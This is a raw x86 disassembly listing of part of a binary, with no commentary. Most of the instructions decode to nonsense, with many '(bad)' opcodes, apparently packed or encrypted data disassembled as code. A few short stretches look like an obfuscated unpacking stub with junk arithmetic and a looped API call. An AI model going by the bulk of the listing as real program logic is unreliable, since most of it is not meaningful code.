  411958:	arpl   WORD PTR [esi+ebx*2],sp
  41195b:	push   ss
  41195c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41195d:	inc    ebp
  41195e:	loope  0x4119b4
  411960:	ror    al,cl
  411962:	test   eax,0x291414d9
  411967:	gs out 0x5,eax
  41196a:	add    esp,ebp
  41196c:	and    ah,bl
  41196e:	or     cl,0xd1
  411971:	retf   0x4b1d
  411974:	cld    
  411975:	arpl   cx,di
  411977:	ins    BYTE PTR es:[edi],dx
  411978:	sbb    ch,0x59
  41197b:	and    dh,BYTE PTR [ebp+0xed6068c]
  411981:	sub    DWORD PTR [esp+ecx*1+0x73709c1b],esp
  411988:	daa    
  411989:	jl     0x4119da
  41198b:	pushf  
  41198c:	ret    
  41198d:	sub    bh,BYTE PTR [ecx+0x40]
  411990:	xchg   edi,eax
  411991:	fcomp  DWORD PTR [eax-0x21d1b01f]
  411997:	imul   esp,DWORD PTR [ebx+0x31],0xd200cce
  41199e:	mov    dh,0x83
  4119a0:	js     0x411964
  4119a2:	test   al,bl
  4119a4:	fwait
  4119a5:	aaa    
  4119a6:	mov    esi,0x25c10a98
  4119ab:	mov    ebx,0x9b6940b9
  4119b0:	ret    
  4119b1:	mov    cl,0x9b
  4119b3:	jle    0x41195a
  4119b5:	push   es
  4119b6:	cmp    BYTE PTR [ebx+0x4719da87],0xc4
  4119bd:	cld    
  4119be:	outs   dx,DWORD PTR ds:[esi]
  4119bf:	int3   
  4119c0:	ds test al,0xfb
  4119c3:	leave  
  4119c4:	call   0xdbfe:0x984f2972
  4119cb:	ss xor ecx,ebp
  4119ce:	inc    esp
  4119cf:	jecxz  0x4119a8
  4119d1:	pop    ss
  4119d2:	jae    0x41199d
  4119d4:	mov    ecx,0xd16a3d3c
  4119d9:	in     eax,0x4c
  4119db:	idiv   DWORD PTR [edi]
  4119dd:	push   ebp
  4119de:	adc    BYTE PTR [esi],dl
  4119e0:	add    dh,bl
  4119e2:	mov    ebp,0xc80f4795
  4119e7:	mov    al,0xf2
  4119e9:	and    ecx,DWORD PTR [edi-0x485cf489]
  4119ef:	cdq    
  4119f0:	inc    edi
  4119f1:	pop    edx
  4119f2:	xlat   BYTE PTR ds:[ebx]
  4119f3:	out    0xfb,eax
  4119f5:	mov    bl,0xe4
  4119f7:	ss mov ebx,0xe1b404f2
  4119fd:	cmp    DWORD PTR [esi-0x25cf877d],esi
  411a03:	jno    0x4119f7
  411a05:	mov    ebx,0x23989b
  411a0a:	sbb    ebp,esp
  411a0c:	fild   WORD PTR [ebx]
  411a0e:	gs push ebp
  411a10:	add    bh,BYTE PTR [edx-0x50de3596]
  411a16:	in     al,0x27
  411a18:	fisub  DWORD PTR [esi-0x4c685a39]
  411a1e:	or     al,0x2a
  411a20:	xchg   ebp,eax
  411a21:	push   ebx
  411a22:	add    al,0x5b
  411a24:	loop   0x411a46
  411a26:	push   ecx
  411a27:	pushf  
  411a28:	stos   BYTE PTR es:[edi],al
  411a29:	fidiv  DWORD PTR [edx-0x23]
  411a2c:	stos   DWORD PTR es:[edi],eax
  411a2d:	(bad)  
  411a2e:	(bad)  
  411a30:	push   0xec8a9448
  411a35:	(bad)  
  411a36:	pushf  
  411a37:	or     ch,BYTE PTR [eax+0x79cb1ffc]
  411a3d:	cld    
  411a3e:	test   BYTE PTR [edx+0x27cd4e41],ah
  411a44:	push   es
  411a45:	in     eax,0xdb
  411a47:	xor    eax,0x120c15d2
  411a4c:	and    eax,0x425f46a1
  411a51:	dec    ebp
  411a52:	mov    ecx,0xb0299db
  411a57:	into   
  411a58:	push   ebp
  411a59:	stos   DWORD PTR es:[edi],eax
  411a5a:	es aam 0x61
  411a5d:	xchg   ebp,eax
  411a5e:	add    eax,0xeefa9feb
  411a63:	mov    eax,ds:0x83bd3c07
  411a68:	jge    0x411a4f
  411a6a:	cmp    BYTE PTR [ecx+0x318d5645],bl
  411a70:	pop    esi
  411a71:	imul   ebx,DWORD PTR [edi-0x6f],0x24
  411a75:	mov    esi,0xdbe4556b
  411a7a:	dec    edi
  411a7b:	addr16 in al,0x12
  411a7e:	das    
  411a7f:	clc    
  411a80:	jae    0x411ae8
  411a82:	xchg   edi,eax
  411a83:	test   DWORD PTR [esi],0xfc06da12
  411a89:	sahf   
  411a8a:	ficom  DWORD PTR [ebp-0x33]
  411a8d:	out    dx,eax
  411a8e:	sbb    edx,esi
  411a90:	leave  
  411a91:	mov    ebx,0x3dd011b2
  411a96:	fcomp  QWORD PTR [ebx-0x77]
  411a99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a9a:	push   esi
  411a9b:	mov    edi,0xd0d3af37
  411aa0:	mov    bl,0x7a
  411aa2:	pop    ds
  411aa3:	pop    ss
  411aa4:	popa   
  411aa5:	aas    
  411aa6:	jg     0x411a8b
  411aa8:	rcr    BYTE PTR [esi-0xd6a0986],0x83
  411aaf:	fstp   TBYTE PTR [ebx+0x6c95e5ca]
  411ab5:	or     edi,DWORD PTR [ebp-0x1c54b3c0]
  411abb:	int3   
  411abc:	mov    al,0x88
  411abe:	xchg   edi,eax
  411abf:	add    ebx,DWORD PTR [ebp+0x19]
  411ac2:	cmp    BYTE PTR [ecx+0x59],bh
  411ac5:	push   esp
  411ac6:	push   ebx
  411ac7:	enter  0xe6f0,0x76
  411acb:	clc    
  411acc:	loopne 0x411a99
  411ace:	pcmpgtd mm3,QWORD PTR [ebx+eiz*1-0x12b48a62]
  411ad6:	inc    edx
  411ad7:	sbb    al,BYTE PTR [esi-0x7a]
  411ada:	sbb    bh,BYTE PTR [ecx-0x7286583b]
  411ae0:	mov    esi,DWORD PTR [ebp-0x1c]
  411ae3:	xor    DWORD PTR [ecx+edi*1],esp
  411ae6:	ror    ebx,cl
  411ae8:	and    edi,DWORD PTR [eax+0x2]
  411aeb:	lods   al,BYTE PTR ds:[esi]
  411aec:	dec    eax
  411aed:	outs   dx,BYTE PTR ds:[esi]
  411aee:	das    
  411aef:	mov    eax,ds:0xb224620c
  411af4:	pop    ds
  411af5:	ficomp WORD PTR [edi+0x156a3bcd]
  411afb:	in     eax,0x87
  411afd:	xchg   edx,eax
  411afe:	pop    edx
  411aff:	in     al,dx
  411b00:	in     eax,dx
  411b01:	sbb    DWORD PTR [edx-0x6a],ebp
  411b04:	icebp  
  411b05:	addr16 inc edi
  411b07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b08:	mov    bl,0x2b
  411b0a:	push   ds
  411b0b:	jo     0x411b2f
  411b0d:	sbb    eax,0xb721ad20
  411b12:	gs pop esp
  411b14:	sbb    al,0xbd
  411b16:	lods   eax,DWORD PTR ds:[esi]
  411b17:	sbb    BYTE PTR [esp+esi*8+0x9],ah
  411b1b:	add    eax,0xf7d6e815
  411b20:	shr    DWORD PTR [edx+0x12],cl
  411b23:	or     eax,0x17c4e8b7
  411b28:	shl    DWORD PTR [edx+0x6867c93e],cl
  411b2e:	and    BYTE PTR [eax-0x5df64df8],bl
  411b34:	test   eax,0x8840cc60
  411b39:	pushf  
  411b3a:	xchg   edx,eax
  411b3b:	cmp    esi,DWORD PTR [ebp+0x16]
  411b3e:	add    eax,0xa09dadaa
  411b43:	lock fwait
  411b45:	jo     0x411b19
  411b47:	bound  esi,QWORD PTR [edx+0x32867bfc]
  411b4d:	sbb    DWORD PTR [edx+ebp*4],ecx
  411b50:	pop    es
  411b51:	cmp    DWORD PTR [edi-0x6d6e8be6],ebx
  411b57:	cmp    esi,edi
  411b59:	shr    BYTE PTR [edi+0x52],cl
  411b5c:	or     dl,BYTE PTR [ebp-0x78]
  411b5f:	xchg   ebp,ebp
  411b61:	outs   dx,BYTE PTR ds:[esi]
  411b62:	jg     0x411b77
  411b64:	and    ebp,ebx
  411b66:	(bad)  
  411b67:	das    
  411b68:	mov    ch,0x9d
  411b6a:	and    eax,0xd45241a1
  411b6f:	imul   edi,DWORD PTR [edi+0x4c],0x6e854c9a
  411b76:	arpl   di,ax
  411b78:	xchg   esi,eax
  411b79:	iret   
  411b7a:	sub    ebp,DWORD PTR [ebp+ebp*2-0x1d223639]
  411b81:	mov    ebx,0x6eda4fb
  411b86:	sbb    BYTE PTR [edi-0x2a03a56f],ah
  411b8c:	and    DWORD PTR [esi],eax
  411b8e:	dec    ecx
  411b8f:	(bad)  
  411b90:	jl     0x411bce
  411b92:	stc    
  411b93:	and    BYTE PTR [edx+0x17],bh
  411b96:	add    al,0xc1
  411b98:	mov    cl,0xe8
  411b9a:	pop    edi
  411b9b:	inc    ebp
  411b9c:	popf   
  411b9d:	push   0x5a4564b
  411ba2:	es mov edx,0x648f16e9
  411ba8:	stos   BYTE PTR es:[edi],al
  411ba9:	or     dl,BYTE PTR [edi]
  411bab:	mov    BYTE PTR [ebx+0x22],dl
  411bae:	and    al,0xad
  411bb0:	dec    ebp
  411bb1:	push   edx
  411bb2:	and    ch,BYTE PTR [ebx+0x5f35228e]
  411bb8:	sbb    DWORD PTR [edi-0x36],ebp
  411bbb:	jmp    0x7ac9ea41
  411bc0:	mov    ds:0x1165cdcd,al
  411bc5:	add    al,0x1
  411bc7:	xchg   BYTE PTR [esi-0x1d],dl
  411bca:	scas   eax,DWORD PTR es:[edi]
  411bcb:	pusha  
  411bcc:	adc    al,al
  411bce:	sahf   
  411bcf:	inc    edx
  411bd0:	mov    esp,0x4eaf63c1
  411bd5:	ins    BYTE PTR es:[edi],dx
  411bd6:	test   eax,0x7929bf9a
  411bdb:	and    DWORD PTR [edx+0x29],edx
  411bde:	out    dx,eax
  411bdf:	xchg   ecx,eax
  411be0:	push   edi
  411be1:	js     0x411c26
  411be3:	leave  
  411be4:	push   es
  411be5:	sbb    al,0xf
  411be7:	fadd   DWORD PTR [ecx+0x55fd29a5]
  411bed:	mov    ebp,0xa3c6e666
  411bf2:	dec    ecx
  411bf3:	sbb    eax,0x2dfc991c
  411bf8:	push   ebp
  411bf9:	lods   eax,DWORD PTR ds:[esi]
  411bfa:	js     0x411c2b
  411bfc:	mov    edi,0xf3886628
  411c01:	xor    bp,si
  411c04:	fidiv  DWORD PTR [esi+0x32]
  411c07:	outs   dx,DWORD PTR ds:[esi]
  411c08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c09:	pop    es
  411c0a:	test   al,0xd7
  411c0c:	sbb    eax,0xf5c15eba
  411c11:	(bad)  
  411c13:	mov    ds,WORD PTR [ebp-0x3b]
  411c16:	fcom   DWORD PTR [edx-0x50]
  411c19:	not    BYTE PTR [edx-0x2d343208]
  411c1f:	xchg   ecx,eax
  411c20:	pop    esi
  411c21:	stos   BYTE PTR es:[edi],al
  411c22:	(bad)
  411c26:	in     al,0xcb
  411c28:	js     0x411bd9
  411c2a:	arpl   dx,dx
  411c2c:	mov    WORD PTR [eax+0x31],ss
  411c2f:	lahf   
  411c30:	xchg   DWORD PTR [ebx+ebx*1],ecx
  411c33:	out    dx,al
  411c34:	inc    ecx
  411c35:	cmp    BYTE PTR ds:0x63745e98,dh
  411c3b:	pop    edi
  411c3c:	shl    BYTE PTR [ebx*4+0x12619584],cl
  411c43:	std    
  411c44:	cli    
  411c45:	mov    ch,0x27
  411c47:	push   cs
  411c48:	popa   
  411c49:	xchg   edx,ecx
  411c4b:	lds    ebp,FWORD PTR [edx-0x6e33fbf9]
  411c51:	rcr    BYTE PTR [esi+esi*1+0x776f38db],1
  411c58:	sub    al,0xcf
  411c5a:	push   edi
  411c5b:	imul   esp,eax,0xffffffba
  411c5e:	sti    
  411c5f:	in     al,dx
  411c60:	adc    bl,BYTE PTR [ebx+0x32a8a6b3]
  411c66:	mov    ds:0xc224064e,al
  411c6b:	pop    ss
  411c6c:	nop
  411c6d:	mov    eax,ds:0x41b22c
  411c72:	add    eax,DWORD PTR ds:0x41b224
  411c78:	jmp    0x411c84
  411c7d:	mov    eax,DWORD PTR [ebp+0xc]
  411c80:	xor    eax,ecx
  411c82:	add    eax,edx
  411c84:	mov    ds:0x41b224,eax
  411c89:	mov    eax,DWORD PTR [ebp+0xc]
  411c8c:	xor    eax,ecx
  411c8e:	add    eax,edx
  411c90:	mov    ds:0x41b22c,eax
  411c95:	jmp    0x4120a9
  411c9a:	mov    eax,ds:0x41b22c
  411c9f:	mov    ds:0x41b224,eax
  411ca4:	jmp    0x4120a9
  411ca9:	mov    dh,0x72
  411cab:	cwde   
  411cac:	test   al,0x64
  411cae:	jb     0x411c66
  411cb0:	jb     0x411ca3
  411cb2:	xchg   ecx,eax
  411cb3:	adc    eax,0x17b6d45e
  411cb8:	jb     0x411d18
  411cba:	push   ebx
  411cbb:	jo     0x411d2d
  411cbd:	pop    eax
  411cbe:	jge    0x411d30
  411cc0:	jo     0x411c5b
  411cc2:	cmp    DWORD PTR [ebp+0x15f2d333],edx
  411cc8:	jo     0x411c6b
  411cca:	inc    ecx
  411ccb:	into   
  411ccc:	dec    edx
  411ccd:	into   
  411cce:	push   ds
  411ccf:	mov    es,WORD PTR [edx-0x64]
  411cd2:	pop    esi
  411cd3:	or     eax,esi
  411cd5:	mov    al,0x79
  411cd7:	mov    al,ds:0x51cd6849
  411cdc:	je     0x411d1d
  411cde:	shl    DWORD PTR [ebx-0x18020038],1
  411ce4:	pop    es
  411ce5:	fadd   st,st(5)
  411ce7:	js     0x411ca6
  411ce9:	add    al,0xcd
  411ceb:	cmp    ebp,ebx
  411ced:	push   es
  411cee:	cs loope 0x411cbc
  411cf1:	rol    dl,cl
  411cf3:	fist   DWORD PTR [esi+0x3e153fda]
  411cf9:	loope  0x411d63
  411cfb:	cmp    al,0x89
  411cfd:	xlat   BYTE PTR ds:[ebx]
  411cfe:	inc    ebx
  411cff:	cld    
  411d00:	call   0x450fd6aa
  411d05:	test   al,0x35
  411d07:	sbb    DWORD PTR [ecx+0x26bf7ead],0xdb2b460e
  411d11:	dec    esp
  411d12:	lods   al,BYTE PTR ds:[esi]
  411d13:	icebp  
  411d14:	pop    ecx
  411d15:	ror    BYTE PTR [ecx+0x78a044aa],1
  411d1b:	call   0x9c1b795e
  411d20:	or     eax,ebp
  411d22:	sbb    ebx,eax
  411d24:	dec    esp
  411d25:	mov    ch,0xbe
  411d27:	jl     0x411d47
  411d29:	sbb    al,0x3c
  411d2b:	jmp    0x90d04e92
  411d30:	cmp    eax,0x416a85cf
  411d35:	lea    eax,[ebx-0x4e]
  411d38:	inc    ebx
  411d39:	adc    al,0x89
  411d3b:	call   FWORD PTR [esi+0x65]
  411d3e:	lds    esi,FWORD PTR [edx+0x5f]
  411d41:	retf   
  411d42:	mov    ds:0xaed85548,eax
  411d47:	(bad)  
  411d48:	sbb    al,BYTE PTR [esi]
  411d4a:	jmp    0xd7a9de77
  411d4f:	cmp    eax,0x91c3cab2
  411d54:	lea    ebx,[edi+0x45]
  411d57:	int    0x12
  411d59:	fwait
  411d5a:	(bad)  
  411d5b:	mov    bh,0xb0
  411d5d:	dec    edi
  411d5e:	jne    0x411d83
  411d60:	in     al,0xa3
  411d62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d63:	jae    0x411dc2
  411d65:	mov    cl,0x8d
  411d67:	and    ecx,ecx
  411d69:	pusha  
  411d6a:	mov    esp,DWORD PTR [ebx]
  411d6c:	adc    al,0x5b
  411d6e:	fist   DWORD PTR [eax]
  411d70:	sar    BYTE PTR [esi],0x5d
  411d73:	cmp    eax,0x7c57102b
  411d78:	jnp    0x411d03
  411d7a:	adc    esp,ebp
  411d7c:	std    
  411d7d:	dec    edi
  411d7e:	ins    DWORD PTR es:[edi],dx
  411d7f:	in     al,dx
  411d80:	loopne 0x411dc2
  411d82:	mov    ebx,0xb5de52bc
  411d87:	fmul   DWORD PTR [esi]
  411d89:	mov    esp,edi
  411d8b:	dec    ebp
  411d8c:	in     al,dx
  411d8d:	in     eax,dx
  411d8e:	jne    0x411d10
  411d90:	loopne 0x411dc1
  411d92:	sbb    BYTE PTR [edx+0x49],dh
  411d95:	outs   dx,DWORD PTR ds:[esi]
  411d96:	pop    ss
  411d97:	cmp    edx,DWORD PTR [ebx-0xf]
  411d9a:	push   ecx
  411d9b:	add    ah,BYTE PTR [esi+0x4dda6dc]
  411da1:	fbstp  TBYTE PTR [esi+0x3b]
  411da4:	push   edi
  411da5:	test   eax,0x9a33ddbd
  411daa:	jne    0x411dfb
  411dac:	lds    edx,FWORD PTR [ebp-0x6ac29795]
  411db2:	dec    esp
  411db3:	mov    bl,0xb4
  411db5:	ins    BYTE PTR es:[edi],dx
  411db6:	mov    al,0x92
  411db8:	jmp    0x596:0x24b36a4d
  411dbf:	std    
  411dc0:	data16 aas 
  411dc2:	push   ebx
  411dc3:	out    dx,al
  411dc4:	sbb    cl,0x36
  411dc7:	lahf   
  411dc8:	imul   esi,DWORD PTR gs:[ebp-0x6f],0x1a
  411dcd:	scas   al,BYTE PTR es:[edi]
  411dce:	inc    ebx
  411dcf:	out    0x3a,al
  411dd1:	cmp    BYTE PTR ds:0xa604430e,ah
  411dd7:	call   0xcf56:0x3850c29
  411dde:	adc    eax,0xe67e488c
  411de3:	or     edi,DWORD PTR [ebx-0x50]
  411de6:	pause  
  411de8:	push   eax
  411de9:	dec    esi
  411dea:	sbb    DWORD PTR [esi],ecx
  411dec:	outs   dx,BYTE PTR ds:[esi]
  411ded:	add    dh,BYTE PTR [edi-0x73aa2f7b]
  411df3:	mov    dl,0x1b
  411df5:	daa    
  411df6:	enter  0x9648,0xc7
  411dfa:	ret    0xde81
  411dfd:	mov    dh,0xa1
  411dff:	test   al,0xc
  411e01:	(bad)  
  411e02:	pop    ecx
  411e03:	and    edx,ecx
  411e05:	inc    ebx
  411e06:	ffreep st(7)
  411e08:	(bad)  
  411e09:	mov    ah,0xb6
  411e0b:	fstp   DWORD PTR [edx-0x34e69d80]
  411e11:	fucomp st(5)
  411e13:	aam    0xcb
  411e15:	test   BYTE PTR [esi+esi*8-0x59],al
  411e19:	jle    0x411df4
  411e1b:	mov    al,ds:0xfbe10ff9
  411e20:	or     dl,al
  411e22:	test   BYTE PTR [edx],ch
  411e24:	lods   al,BYTE PTR es:[esi]
  411e26:	sti    
  411e27:	das    
  411e28:	out    dx,eax
  411e29:	enter  0xd534,0xef
  411e2d:	sub    dl,ch
  411e2f:	inc    edx
  411e30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e31:	pop    edi
  411e32:	pop    edi
  411e33:	lods   al,BYTE PTR ds:[esi]
  411e34:	add    ch,BYTE PTR [esi-0x72]
  411e37:	stos   BYTE PTR es:[edi],al
  411e38:	out    0xb3,eax
  411e3a:	push   esi
  411e3b:	dec    eax
  411e3c:	popf   
  411e3d:	call   0xe8b:0xa6a8f02f
  411e44:	xor    eax,0x5fa71852
  411e49:	mov    ah,0x97
  411e4b:	pop    esi
  411e4c:	sar    BYTE PTR [edx+0x72ed6225],1
  411e52:	sbb    DWORD PTR [ebp-0x4b],0x65
  411e56:	call   0xf62c:0xf8eea3c9
  411e5d:	in     eax,dx
  411e5e:	mov    eax,0xa062fc80
  411e63:	test   al,0xac
  411e65:	mov    ebx,0x4815c1a6
  411e6a:	arpl   WORD PTR [edi-0x1],bp
  411e6d:	ss call 0x505c2537
  411e73:	cs jnp 0x411e03
  411e76:	pop    ebx
  411e77:	adc    ax,0xa6c9
  411e7b:	push   ebp
  411e7c:	mov    edi,0x3597b90f
  411e81:	data16 (bad) 
  411e83:	clc    
  411e84:	int    0x2d
  411e86:	sbb    esp,DWORD PTR [ecx]
  411e88:	mov    cl,0xb2
  411e8a:	push   esp
  411e8b:	xor    eax,0x8c9807eb
  411e90:	xor    DWORD PTR [edx],edx
  411e92:	pop    eax
  411e93:	add    cl,BYTE PTR [edi-0x394944c1]
  411e99:	(bad)  
  411e9a:	repnz sbb DWORD PTR [edi-0x53],ebx
  411e9e:	sub    al,0xcd
  411ea0:	hlt    
  411ea1:	sbb    ebp,DWORD PTR [ebp-0x3a3361d5]
  411ea7:	jns    0x411e89
  411ea9:	mov    eax,ebp
  411eab:	gs mov edx,0x28a914d2
  411eb1:	retf   0xd2ec
  411eb4:	std    
  411eb5:	daa    
  411eb6:	out    0x70,al
  411eb8:	mov    esi,0xf5345dac
  411ebd:	icebp  
  411ebe:	cmp    al,0x2b
  411ec0:	pop    eax
  411ec1:	mov    cl,0x8c
  411ec3:	jno    0x411ee3
  411ec5:	mov    ecx,0x8df1ed2b
  411eca:	push   cs
  411ecb:	popf   
  411ecc:	jae    0x411f30
  411ece:	lock pusha 
  411ed0:	addr16 inc ebp
  411ed2:	nop
  411ed3:	inc    edx
  411ed4:	dec    esp
  411ed5:	lds    esp,FWORD PTR [edx]
  411ed7:	fild   QWORD PTR [esi+eax*8+0xf53074f]
  411ede:	mov    WORD PTR [ebx-0x5a28a959],fs
  411ee4:	fdivr  QWORD PTR [edx+0x4c25887d]
  411eea:	adc    eax,0x166bb928
  411eef:	mov    WORD PTR [ebx-0xd],gs
  411ef2:	inc    eax
  411ef3:	test   BYTE PTR [edx+0x3215a922],al
  411ef9:	call   0xb180f628
  411efe:	mov    esp,0x6db3d650
  411f03:	lock (bad) 
  411f06:	sub    eax,0xe3a9bd37
  411f0b:	hlt    
  411f0c:	xor    al,0xb5
  411f0e:	inc    edx
  411f0f:	(bad)  
  411f10:	xchg   ebx,eax
  411f11:	or     al,0x9d
  411f13:	data16 sbb al,0x63
  411f16:	std    
  411f17:	add    DWORD PTR [ebp-0x18],0x16043627
  411f1e:	inc    edi
  411f1f:	(bad)  
  411f20:	or     eax,0xfa1bbd54
  411f25:	retf   
  411f26:	ds loopne 0x411ef9
  411f29:	mov    esp,0xb9b05328
  411f2e:	mov    DWORD PTR [esi+0x30],edx
  411f31:	out    0x16,eax
  411f33:	mov    DWORD PTR [ebp-0x6988b1bf],eax
  411f39:	sub    BYTE PTR [esp+ebp*8],0xf1
  411f3d:	mov    ebp,0xaefea303
  411f42:	adc    dl,BYTE PTR [ebp-0x4]
  411f45:	xchg   esp,eax
  411f46:	imul   ecx,DWORD PTR [esi-0x7f],0xffffff84
  411f4a:	test   DWORD PTR [eax],eax
  411f4c:	push   0x3a
  411f4e:	loopne 0x411f53
  411f50:	rol    dl,0xf8
  411f53:	adc    al,0xb2
  411f55:	mov    al,0x42
  411f57:	repnz add eax,0x85ef23f4
  411f5d:	fisttp QWORD PTR [ebx+eiz*8]
  411f60:	test   bh,bl
  411f62:	ins    DWORD PTR es:[edi],dx
  411f63:	shl    DWORD PTR [ebp-0x6627d60a],1
  411f69:	xor    ecx,esp
  411f6b:	scas   eax,DWORD PTR es:[edi]
  411f6c:	or     edx,DWORD PTR [edi]
  411f6e:	ins    BYTE PTR es:[edi],dx
  411f6f:	mov    dl,0x70
  411f71:	xor    edi,DWORD PTR [ecx+0x4c]
  411f74:	cmp    DWORD PTR [esi],ecx
  411f76:	sahf   
  411f77:	jmp    0x2bcb:0xccd0cd25
  411f7e:	sub    eax,0x7c227ca
  411f83:	jge    0x411fca
  411f85:	cmp    ecx,DWORD PTR [ecx]
  411f87:	mov    es,WORD PTR [ecx-0xede9630]
  411f8d:	fadd   QWORD PTR [edi+0x60]
  411f90:	xor    edx,DWORD PTR [esi+0x7367a2ce]
  411f96:	jbe    0x411ff4
  411f98:	pop    ds
  411f99:	push   eax
  411f9a:	add    DWORD PTR [edi+0x0],ecx
  411f9d:	cmp    al,0xf1
  411f9f:	in     al,0x84
  411fa1:	sub    eax,0x69564ae4
  411fa6:	jne    0x411f57
  411fa8:	jb     0x411fcc
  411faa:	mul    DWORD PTR [edi+0xd]
  411fad:	loopne 0x411f9e
  411faf:	out    dx,al
  411fb0:	inc    ebx
  411fb1:	test   eax,0x1911e694
  411fb6:	call   FWORD PTR [esi+ecx*8+0xbd04c73]
  411fbd:	pop    eax
  411fbe:	ds (bad) 
  411fc0:	jae    0x411f9c
  411fc2:	xor    ch,BYTE PTR [esi]
  411fc4:	(bad)  
  411fc5:	aad    0x77
  411fc7:	imul   edx,DWORD PTR [edx+0xf],0xda7b9385
  411fce:	cmp    bl,BYTE PTR fs:[ecx]
  411fd1:	and    ebx,DWORD PTR [edx+ebx*2+0x3c8039fe]
  411fd8:	dec    ebx
  411fd9:	inc    edx
  411fda:	aad    0x40
  411fdc:	ins    BYTE PTR es:[edi],dx
  411fdd:	adc    al,0xa3
  411fdf:	dec    edi
  411fe0:	ret    0xc299
  411fe3:	stos   DWORD PTR es:[edi],eax
  411fe4:	add    ebp,DWORD PTR [edx+0x765ed506]
  411fea:	inc    edx
  411feb:	aam    0x3d
  411fed:	fcom   QWORD PTR [edx+0x350a15f]
  411ff3:	jo     0x411faf
  411ff5:	mov    ecx,gs
  411ff7:	cmp    BYTE PTR [edx],bh
  411ff9:	mov    edi,ebp
  411ffb:	jmp    0xeb798572
  412000:	popa   
  412001:	adc    BYTE PTR [ebp+0x61f5d746],bh
  412007:	sub    BYTE PTR [eax+0x713e5d7a],ah
  41200d:	and    eax,DWORD PTR [esi+0x0]
  412010:	mov    edx,0xd0e87c2d
  412015:	imul   esp,DWORD PTR [eax*2+0xa66eacd],0xd32893d6
  412020:	push   edi
  412022:	add    ecx,DWORD PTR [ebx+0x4]
  412025:	xchg   DWORD PTR [ecx+0x45ccaad],ebp
  41202b:	dec    edx
  41202c:	pop    es
  41202d:	inc    esp
  41202e:	pop    eax
  41202f:	ins    DWORD PTR es:[edi],dx
  412030:	icebp  
  412031:	lods   eax,DWORD PTR ds:[esi]
  412032:	loop   0x41208b
  412034:	xchg   DWORD PTR [edi-0x5f],ebx
  412037:	xchg   BYTE PTR [ebx-0x70067792],cl
  41203d:	sbb    BYTE PTR [ecx+0x67],dl
  412040:	add    eax,0x23293e30
  412045:	cdq    
  412046:	call   0xb0e5:0xc9a9ebe4
  41204d:	mov    esp,0xe955279e
  412052:	jae    0x41209d
  412054:	out    dx,eax
  412055:	add    BYTE PTR [eax-0x43df5ec5],al
  41205b:	call   0x4e8e:0x44cdf21b
  412062:	lods   eax,DWORD PTR ds:[esi]
  412063:	cwde   
  412064:	mov    ecx,0x1711f5f6
  412069:	shl    BYTE PTR [edi-0x31],1
  41206c:	cmp    DWORD PTR [ecx-0x38f12a05],ecx
  412072:	or     eax,0xee918ef2
  412077:	sub    eax,0xb255cd8d
  41207c:	mov    WORD PTR [edx+0x4db7b626],ss
  412082:	push   ebx
  412083:	test   BYTE PTR [eax-0x7cccd750],bh
  412089:	out    0xa0,al
  41208b:	call   0xaf7ce62f
  412090:	or     edi,DWORD PTR [edx]
  412092:	or     DWORD PTR [eax-0x15],esp
  412095:	ret    0xe8d5
  412098:	mov    ebp,0xe127ee17
  41209d:	cmp    DWORD PTR [eax+0x4d],ecx
  4120a0:	push   ebp
  4120a1:	das    
  4120a2:	adc    BYTE PTR [esi-0x36],0x19
  4120a6:	aad    0x46
  4120a8:	adc    BYTE PTR [ebx+0x8b0845],cl
  4120ae:	mov    ecx,DWORD PTR ds:0x41b224
  4120b4:	add    DWORD PTR [eax],ecx
  4120b6:	pop    esi
  4120b7:	pop    ebp
  4120b8:	ret    0x8
  4120bb:	push   ebp
  4120bc:	mov    ebp,esp
  4120be:	sub    esp,0x30
  4120c1:	and    ecx,DWORD PTR ds:0x42fd76
  4120c7:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  4120ce:	mov    eax,ds:0x42fcd5
  4120d3:	adc    DWORD PTR ds:0x42e6ef,eax
  4120d9:	mov    DWORD PTR [ebp-0x18],0xf89c8530
  4120e0:	sbb    DWORD PTR ds:0x42e6eb,0x6a34
  4120ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4120ed:	sub    DWORD PTR ds:0x42e703,0x730a
  4120f7:	push   ebx
  4120f8:	mov    DWORD PTR ds:0x42e6fb,0x19
  412102:	cmp    DWORD PTR ds:0x42e6fb,0x0
  412109:	je     0x412140
  41210f:	cmp    DWORD PTR ds:0x42e6fb,0x1e
  412116:	jne    0x41212e
  41211c:	push   0x42fd7e
  412121:	push   0x0
  412123:	push   0x42e26d
  412128:	call   DWORD PTR ds:0x42e483
  41212e:	mov    ebx,DWORD PTR ds:0x42e6fb
  412134:	dec    ebx
  412135:	mov    DWORD PTR ds:0x42e6fb,ebx
  41213b:	jmp    0x412102
  412140:	mov    eax,0x7510855
  412145:	xor    ecx,eax
  412147:	sub    ebx,0x2eeb
  41214d:	mov    ebx,0x32729c
  412152:	sbb    DWORD PTR ds:0x42e120,0x42fd01
  41215c:	jmp    0x412440
  412161:	mov    edx,0xf222c858
  412166:	mov    dl,0x6a
  412168:	pop    eax
  412169:	dec    eax
  41216a:	xor    bh,0xa0
  41216d:	out    dx,eax
  41216e:	test   ebx,ebp
  412170:	cmovbe ebx,DWORD PTR [edi+0x70]
  412174:	jo     0x41212f
  412176:	jle    0x4121e8
  412178:	jo     0x4121ed
  41217a:	repnz mov fs,WORD PTR [esi+0x60]
  41217e:	mov    esi,0x5de2654d
  412183:	sbb    BYTE PTR [ebx+esi*2-0x7b],dl
  412187:	push   0x8d12ed9e
  41218c:	es jmp 0xed40:0xb147a73c
  412194:	and    al,0x74
  412196:	sub    BYTE PTR [edx+ecx*4],cl
  412199:	mov    DWORD PTR [eax],edi
  41219b:	push   cs
  41219c:	les    esp,FWORD PTR [esi]
  41219e:	jmp    0x2e66:0xe4714c6e
  4121a5:	jp     0x41219c
  4121a7:	repnz xchg edi,eax
  4121a9:	add    al,0x79
  4121ab:	out    dx,al
  4121ac:	xchg   edi,eax
  4121ad:	neg    ebx
  4121af:	ins    BYTE PTR es:[edi],dx
  4121b0:	pushf  
  4121b1:	or     al,0x5f
  4121b3:	ret    0x6195
  4121b6:	mov    ecx,0xd1d596aa
  4121bb:	or     al,0x5
  4121bd:	iret   
  4121be:	mov    bl,0xa2
